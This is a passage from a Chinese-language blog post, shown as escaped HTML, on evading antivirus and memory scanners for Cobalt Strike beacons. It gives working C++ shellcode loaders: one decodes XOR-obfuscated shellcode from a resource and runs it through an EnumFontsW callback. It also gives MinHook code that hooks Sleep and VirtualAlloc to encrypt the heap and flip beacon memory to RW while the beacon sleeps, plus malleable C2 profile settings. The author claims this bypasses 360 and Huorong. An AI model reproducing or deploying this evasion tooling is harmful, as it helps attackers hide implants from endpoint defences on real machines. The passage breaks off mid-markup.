data[i] ^&#x3D; R;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void hexToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    HRSRC Png &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_MYRES1), &quot;MYRES&quot;);</span><br><span class=\"line\">    HGLOBAL LoadPng &#x3D; LoadResource(NULL, Png);</span><br><span class=\"line\">    DWORD PngSize &#x3D; SizeofResource(NULL, Png);</span><br><span class=\"line\">    LPVOID PngData &#x3D; LockResource(LoadPng);</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    const size_t length &#x3D; PngSize &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\">    unsigned char* mypng &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    char* charPtr &#x3D; reinterpret_cast&lt;char*&gt;(PngData);</span><br><span class=\"line\">    hexToBytes((string)charPtr, mypng, length);</span><br><span class=\"line\">    unsigned char key[] &#x3D; &quot;baidu.com&quot;;</span><br><span class=\"line\">    enc_dec(key, mypng);</span><br><span class=\"line\">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)mypng, NULL);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507104803245.png\" alt=\"image-20240507104803245\"></p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>总的来说，目前为止学会上面的 shellcode加载、shellcode加密、分离免杀后，搭配下面的 杂项 内容，基本动静态绕过360/火绒已经基本不是问题了。绕过QVM的主要方法就是添加资源、添加资源、还是TM的添加资源，尽量不要让程序太小，之前没有添加资源的时候编译出来200kb左右，很难直接免杀。火绒直接用远程拉取就行。</p>\n<h1 id=\"内存动态免杀\"><a href=\"#内存动态免杀\" class=\"headerlink\" title=\"内存动态免杀\"></a>内存动态免杀</h1><p><a href=\"https://www.blackhillsinfosec.com/avoiding-memory-scanners/\">Avoiding Memory Scanners</a>，文章提出三种扫描检测方向：</p>\n<ol>\n<li>利用yara在内存中匹配cobalt strike相关字符串/字节</li>\n<li>内存页面属性</li>\n<li>堆栈跟踪</li>\n</ol>\n<p>给出了几种bypass方向</p>\n<ol>\n<li>动态堆加/解密</li>\n<li>避免睡眠</li>\n<li>属性修改</li>\n<li>堆栈欺骗</li>\n</ol>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>要在内存中免杀，首先要知道cs在内存中是怎么活动的或者说知道cs的 beacon 从生成到上线再到执行的整个流程。</p>\n<p>文章：<a href=\"https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzkxMTMxMjI2OQ==&scene=23&album_id=2280727834220429320\">CobaltStrike逆向学习系列</a>    <a href=\"https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao\">Cobalt Strike原理介绍</a>   <a href=\"https://tttang.com/archive/1631/\">CobaltStrike Beacon生成原理分析</a>  <a href=\"https://forum.butian.net/share/2017\">Cobaltstrike4.0 shellcode分析</a></p>\n<p>从流程中总结出内存特征</p>\n<p>文章：<a href=\"https://blog.nsfocus.net/beaconeye-cs/\">从BeaconEye说起，围绕CS内存特征的检测与规避</a>     <a href=\"https://mp.weixin.qq.com/s/_gSPWVb1b-xuvhU6ynmw0Q\">如何正确的 “手撕” Cobalt Strike</a></p>\n<p>最后根据特征bypass。</p>\n<h2 id=\"动态堆加-解密\"><a href=\"#动态堆加-解密\" class=\"headerlink\" title=\"动态堆加/解密\"></a>动态堆加/解密</h2><h3 id=\"minhook\"><a href=\"#minhook\" class=\"headerlink\" title=\"minhook\"></a>minhook</h3><p>一个用于hook winapi的稳定库，下载Releases中的lib.zip，<a href=\"https://github.com/TsudaKageyu/minhook\">TsudaKageyu/minhook: The Minimalistic x86/x64 API Hooking Library for Windows</a></p>\n<p>项目中新建include、libs文件夹，如下结构</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093423537.png\" alt=\"image-20240508093423537\"></p>\n<p>并添加目录进行引用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093253085.png\" alt=\"image-20240508093253085\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093345168.png\" alt=\"image-20240508093345168\"></p>\n<p>测试</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093500489.png\" alt=\"image-20240508093500489\"></p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><ol>\n<li>hook Sleep()</li>\n<li>运行shellcode上线</li>\n<li>触发MyHookedSleep()</li>\n<li>挂起进程</li>\n<li>加密当前线程的所有堆空间</li>\n<li>Sleep()</li>\n<li>解密当前线程的所有堆空间</li>\n<li>恢复进程</li>\n</ol>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>直接给出代码，Ref：<a href=\"https://github.com/waldo-irc/LockdExeDemo\">waldo-irc/LockdExeDemo</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;MinHook.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#include &quot;Thread.h&quot;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">#if defined _M_X64</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class=\"line\">#elif defined _M_IX86</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class=\"line\">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class=\"line\">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return MH_CreateHookApi(</span><br><span class=\"line\">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL Hook()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------encrypt heap--------------------------------------*&#x2F;</span><br><span class=\"line\">const char key[9] &#x3D; &quot;Aoliao66&quot;;  &#x2F;&#x2F; Encryption Key</span><br><span class=\"line\">size_t keySize &#x3D; sizeof(key);</span><br><span class=\"line\"></span><br><span class=\"line\">void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) &#123;</span><br><span class=\"line\">    for (size_t i &#x3D; 0; i &lt; length; ++i) &#123;</span><br><span class=\"line\">        buffer[i] ^&#x3D; key[i % keyLength];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">PROCESS_HEAP_ENTRY entry;</span><br><span class=\"line\">void HeapEncryptDecrypt() &#123;</span><br><span class=\"line\">    SecureZeroMemory(&amp;entry, sizeof(entry));</span><br><span class=\"line\">    while (HeapWalk(GetProcessHeap(), &amp;entry)) &#123;</span><br><span class=\"line\">        if ((entry.wFlags &amp; PROCESS_HEAP_ENTRY_BUSY) !&#x3D; 0) &#123;</span><br><span class=\"line\">            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------my hook-sleep func--------------------------------*&#x2F;</span><br><span class=\"line\">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD time &#x3D; dwMiliseconds;</span><br><span class=\"line\">    if (time &gt; 1000) &#123;</span><br><span class=\"line\">        DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">        HeapEncryptDecrypt();</span><br><span class=\"line\"></span><br><span class=\"line\">        OldSleep(dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">        HeapEncryptDecrypt();</span><br><span class=\"line\">        DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        OldSleep(time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!Hook()) &#123; return 1; &#125;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;\\xfc\\x48\\x83\\xe4\\xf0...&quot;;  &#x2F;&#x2F; shellcode is here</span><br><span class=\"line\">    const size_t length &#x3D; sizeof(buf);</span><br><span class=\"line\">    unsigned char* mypng &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    RtlMoveMemory(mypng, buf, length);</span><br><span class=\"line\">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)mypng, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译好的BeaconEye：<a href=\"https://github.com/yongsheng220/beaconeye\">beaconeye</a>，BeaconEye直接扫到</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508130409497.png\" alt=\"image-20240508130409497\"></p>\n<p>处理后</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508144113176.png\" alt=\"image-20240508144113176\"></p>\n<p>Ref：<a href=\"https://www.arashparsa.com/hook-heaps-and-live-free/\">Hook Heaps and Live Free</a>、<a href=\"https://mp.weixin.qq.com/s/vrGQ2L-XpMgRqjJxKQhuZQ\">安全开发之堆分配内存加密</a> 、<a href=\"https://mp.weixin.qq.com/s/kJzyjYvWMWoHJJ8LIwodVQ\">【免杀】初探卡巴–堆加密</a> </p>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>这种方式的缺陷或者说比较丑陋的一点是将当前线程挂起，将当前进程所有heap加密，如果现在有注入到其他进程的需求，缺陷就体现的淋漓尽致，会导致宿主进程因为挂起而不稳定甚至崩溃。</p>\n<h2 id=\"属性修改\"><a href=\"#属性修改\" class=\"headerlink\" title=\"属性修改\"></a>属性修改</h2><p>通过hook sleep后将恶意代码所在内存的属性修改为RW。</p>\n<h3 id=\"回顾\"><a href=\"#回顾\" class=\"headerlink\" title=\"回顾\"></a>回顾</h3><p>实现堆加密的目的就是要掩盖恶意代码在内存中的特征，如何在heap中精准定位shellcode？回顾beacon的加载流程为三步</p>\n<ol>\n<li>shellcode(stager)从c2拉取stage(加密beacon.dll)</li>\n<li>开辟新空间，解密stage(beacon.dll)出反射DLL，并调用reflectiveloader</li>\n<li>开辟新空间，将解密的beacon.dll复制到新空间，调用dllmain</li>\n</ol>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508225544787.png\" alt=\"image-20240508225544787\"></p>\n<p>这里就能提出两个问题：</p>\n<p>一、三步中都开辟了新空间，可以hook对应开辟空间的函数从而精准获得恶意代码内存地址，那么应该hook哪个函数？</p>\n<p>二、能否扫描出heap空间特殊的内存属性？因为开辟的空间一定存在的特征是私有提交(private commit)、可执行(X)的属性</p>\n<p>只要解决这两个问题就是两个不同的精准找内存的方法。</p>\n<h3 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>这里简单说下两个问题的解决方法。</p>\n<p>一：stage开辟空间的函数收到c2 profile的影响，profile中的stage规定了allocator的参数作为内存分配的函数，有三个 <code>VirtualAlloc</code> <code>HeapAlloc</code> <code>MapViewOfFile</code> 默认为 VirtualAlloc。所以我们只要hook这三个函数之一，最少可以得到两个地址，然后同时hook Sleep对这两个地址利用 <code>VirtualProtect</code> 修改内存属性。</p>\n<p>hook VirtualAlloc 代码示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">LPVOID WINAPI MyHookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LPVOID address &#x3D; OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class=\"line\">    printf(&quot;address &#x3D; 0X%p\\n&quot;, address);</span><br><span class=\"line\">    return address;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>hook后第一个地址为自己开辟内存执行shellcode的内存地址(RWX)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509152718366.png\" alt=\"image-20240509152718366\"></p>\n<p>二：遍历扫描内存页，标记特殊属性的页面地址，然后hook Sleep进行翻转属性。这是我所能找到的文章普遍采用的方法</p>\n<p>直接贴两个文章：<a href=\"https://maidang.cool/2022/26991.html#Stager\">翻转cs beacon属性页</a>、<a href=\"https://forum.butian.net/share/2620\">一次cs样本免杀实践</a></p>\n<h3 id=\"Malleable-PE-Stage\"><a href=\"#Malleable-PE-Stage\" class=\"headerlink\" title=\"Malleable PE/Stage\"></a>Malleable PE/Stage</h3><p>首先要介绍profile中的配置，你可以在profile中stage标签实现beacon的元数据修改、在内存中的属性、数据的替换、加解密混淆等。</p>\n<ul>\n<li><p>sleep_mask： 设置为true时，会对数据和代码进行异或加密，3.11版本是单字节异或，4.2版本是13字节异或</p>\n</li>\n<li><p>userwx：设置执行反射dll所分配的内存属性，true为RWX，false为RX</p>\n</li>\n<li><p>cleanup：设置true后，会抹去存放在内存中的反射DLL，false则不会</p>\n</li>\n<li><p>stomppe：设置为true时能对MZ、PE和e_lfanew的值进行混淆</p>\n</li>\n<li><p>obfuscate：设置为true时，能混淆dll的导入表、区段名等信息，使得根据导入表匹配的规则失效</p>\n</li>\n</ul>\n<p>这里我的设置为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;true&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;false&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>hook VirtualAlloc，x86上线（当x64 hook三个函数时，会造成内部死锁 <a href=\"https://github.com/TsudaKageyu/minhook/issues/99%EF%BC%89%EF%BC%8Cbeacon%E5%B1%9E%E6%80%A7%E4%B8%BARWX%E4%B8%80%E6%95%B4%E5%9D%97%E5%9C%B0%E5%9D%80%E3%80%82\">https://github.com/TsudaKageyu/minhook/issues/99），beacon属性为RWX一整块地址。</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509181004796.png\" alt=\"image-20240509181004796\"></p>\n<p>再看内存，确实都是beacon的准确地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509181502568.png\" alt=\"image-20240509181502568\"></p>\n<p>再将配置改为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;false&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;false&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>hook VirtualAlloc，x86上线，beacon属性分为RW+RX三部分地址。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510224506184.png\" alt=\"image-20240510224506184\"></p>\n<p>内存情况</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510224646554.png\" alt=\"image-20240510224646554\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;false&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;true&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>sleep_mask开启，hook VirtualAlloc，x86上线，heap内存被动态加密。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510234307048.png\" alt=\"image-20240510234307048\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510234321484.png\" alt=\"image-20240510234321484\"></p>\n<p>个人使用如下配置进行测试</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;false&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;false&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br><span class=\"line\">set rich_header     &quot;&quot;;</span><br><span class=\"line\">set smartinject \t&quot;true&quot;;</span><br><span class=\"line\">set allocator \t\t&quot;VirtualAlloc&quot;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"问题一\"><a href=\"#问题一\" class=\"headerlink\" title=\"问题一\"></a>问题一</h3><p>以编译时x86为例，实战x64环境可以兼容运行x86。hook VirtualAlloc后只留下真正beacon的内存并修改其属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;MinHook.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#if defined _M_X64</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class=\"line\">#elif defined _M_IX86</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存页属性结构体</span><br><span class=\"line\">struct MemoryAttrib &#123;</span><br><span class=\"line\">    LPVOID address;\t\t&#x2F;&#x2F; 内存地址</span><br><span class=\"line\">    DWORD size;\t\t\t&#x2F;&#x2F; 内存大小</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存信息结构体</span><br><span class=\"line\">struct MemoryInfo &#123;</span><br><span class=\"line\">    MemoryAttrib memoryPage[3];\t\t&#x2F;&#x2F; 能找到符合条件的目标内存最多3个</span><br><span class=\"line\">    int index &#x3D; 0;\t\t\t\t\t&#x2F;&#x2F; 内存下标</span><br><span class=\"line\">    BOOL iscleaned &#x3D; FALSE;\t\t\t&#x2F;&#x2F;是否清除之前的beacon和shellcode遗留</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">MemoryInfo memoryInfo;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------misc func----------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 删除 shellcode 和 加密beacon</span><br><span class=\"line\">void DeleteOther()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MemoryAttrib shellcode &#x3D; memoryInfo.memoryPage[0];</span><br><span class=\"line\">    MemoryAttrib enc_beacon &#x3D; memoryInfo.memoryPage[1];</span><br><span class=\"line\">    printf(&quot;[+]shellcode Address at 0x%p\\n&quot;, shellcode.address);</span><br><span class=\"line\">    printf(&quot;[+]enc_beacon Address at 0x%p\\n&quot;, enc_beacon.address);</span><br><span class=\"line\">    &#x2F;&#x2F; 将内存使用0填充</span><br><span class=\"line\">    RtlSecureZeroMemory(shellcode.address, shellcode.size);</span><br><span class=\"line\">    RtlSecureZeroMemory(enc_beacon.address, enc_beacon.size);</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    &#x2F;&#x2F;修改属性</span><br><span class=\"line\">    VirtualProtect(shellcode.address, shellcode.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    VirtualProtect(enc_beacon.address, enc_beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    memoryInfo.iscleaned &#x3D; TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class=\"line\">LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);</span><br><span class=\"line\">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\">LPVOID(WINAPI MyHookedVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class=\"line\">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return MH_CreateHookApi(</span><br><span class=\"line\">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL Hook()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    &#x2F;&#x2F; hook VirtualAlloc</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;Kernel32.dll&quot;, &quot;VirtualAlloc&quot;, &amp;MyHookedVirtualAlloc, &amp;OldVirtualAlloc) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    &#x2F;&#x2F; hook Sleep</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------my hook func--------------------------------*&#x2F;</span><br><span class=\"line\">LPVOID WINAPI MyHookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 1. shellcode 2. enc-beacon 3. beacon</span><br><span class=\"line\">    LPVOID address &#x3D; OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class=\"line\">    printf(&quot;[+]VirtualAlloc: Reserved %d at address 0x%p\\n&quot;, dwSize, address);</span><br><span class=\"line\">    memoryInfo.memoryPage[memoryInfo.index].address &#x3D; address;</span><br><span class=\"line\">    memoryInfo.memoryPage[memoryInfo.index].size &#x3D; (DWORD)dwSize;</span><br><span class=\"line\">    memoryInfo.index++;</span><br><span class=\"line\">    return address;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    if (!memoryInfo.iscleaned) &#123;</span><br><span class=\"line\">        DeleteOther();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    DWORD time &#x3D; dwMiliseconds;</span><br><span class=\"line\">    if (time &gt; 1000) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F;DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RW: address 0x%p\\n&quot;, memoryInfo.memoryPage[2].address);</span><br><span class=\"line\">        VirtualProtect(memoryInfo.memoryPage[2].address, memoryInfo.memoryPage[2].size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\">        OldSleep(dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RWX: address 0x%p\\n&quot;, memoryInfo.memoryPage[2].address);</span><br><span class=\"line\">        VirtualProtect(memoryInfo.memoryPage[2].address, memoryInfo.memoryPage[2].size, PAGE_EXECUTE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\">        &#x2F;&#x2F;DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        OldSleep(time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------main--------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!Hook()) &#123;return 1; &#125;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;\\xfc\\xe8\\x89\\x00\\x00\\x00...&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; sizeof(buf);</span><br><span class=\"line\">    void* shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(shellcode, buf, length);</span><br><span class=\"line\">    ((void(*)(void)) shellcode)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果图：这里直接修改内存为RWX。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515013927782.png\" alt=\"image-20240515013927782\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515014050590.png\" alt=\"image-20240515014050590\"></p>\n<h3 id=\"问题二\"><a href=\"#问题二\" class=\"headerlink\" title=\"问题二\"></a>问题二</h3><p>遍历当前内存页，匹配出带有执行权限的内存地址，标记后进行属性修改。</p>\n<figure class=\"highlight plain\"><table><tr><td 